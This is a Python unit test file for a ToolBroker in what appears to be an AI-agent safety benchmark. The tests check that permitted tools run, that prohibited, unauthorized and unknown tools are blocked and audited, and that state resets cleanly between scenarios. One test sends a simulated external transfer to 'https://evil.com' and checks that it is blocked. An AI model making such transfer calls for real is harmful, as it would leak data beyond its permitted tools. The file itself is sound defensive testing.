"""Unit tests for ToolBroker authorization and state isolation."""

from kalkanbench.models import Document, SyntheticSecret, ToolCall
from kalkanbench.sandbox.broker import ToolBroker


def test_broker_permitted_execution():
    broker = ToolBroker()
    doc = Document(id="doc-1", title="Test Doc", content="Content of document 1.")
    broker.reset_for_scenario(
        scenario_id="sc_01",
        permitted_tools=["read_document"],
        prohibited_tools=[],
        initial_documents=[doc],
    )

    call = ToolCall(tool_name="read_document", arguments={"doc_id": "doc-1"})
    result = broker.execute_tool_call(call)

    assert result.success is True
    assert result.blocked is False
    assert result.output["id"] == "doc-1"
    assert result.output["content"] == "Content of document 1."

    events = broker.get_audit_events()
    assert len(events) == 1
    assert events[0].permitted is True
    assert events[0].executed is True
    assert events[0].blocked is False


def test_broker_blocks_explicitly_prohibited_tool():
    broker = ToolBroker()
    broker.reset_for_scenario(
        scenario_id="sc_prohibited",
        permitted_tools=[],
        prohibited_tools=["request_simulated_external_transfer"],
    )

    call = ToolCall(
        tool_name="request_simulated_external_transfer",
        arguments={"destination_url": "https://evil.com", "payload": {}}
    )
    result = broker.execute_tool_call(call)

    assert result.success is False
    assert result.blocked is True

    events = broker.get_audit_events()
    assert len(events) == 1
    assert events[0].permitted is False
    assert events[0].executed is False
    assert events[0].blocked is True
    assert "prohibited by policy" in events[0].reason


def test_broker_blocks_unauthorized_tool_outside_permitted_list():
    broker = ToolBroker()
    broker.reset_for_scenario(
        scenario_id="sc_limited",
        permitted_tools=["search_documents"],  # only search allowed
    )

    call = ToolCall(
        tool_name="send_simulated_message",
        arguments={"recipient": "bob", "subject": "hi", "body": "test"}
    )
    result = broker.execute_tool_call(call)

    assert result.success is False
    assert result.blocked is True
    assert "unauthorized" in result.error


def test_broker_blocks_unknown_tool():
    broker = ToolBroker()
    broker.reset_for_scenario(scenario_id="sc_unknown")

    call = ToolCall(tool_name="non_existent_shell_cmd", arguments={})
    result = broker.execute_tool_call(call)

    assert result.success is False
    assert result.blocked is True
    assert "not recognized" in result.error


def test_broker_scenario_reset_isolation():
    broker = ToolBroker()
    doc1 = Document(id="d1", title="D1", content="One")
    broker.reset_for_scenario(scenario_id="first", initial_documents=[doc1])

    # Execute read
    broker.execute_tool_call(ToolCall(tool_name="read_document", arguments={"doc_id": "d1"}))
    assert len(broker.get_audit_events()) == 1

    # Reset for second scenario
    broker.reset_for_scenario(scenario_id="second", initial_documents=[])
    assert len(broker.get_audit_events()) == 0
    assert "d1" not in broker.documents
    assert broker.scenario_id == "second"
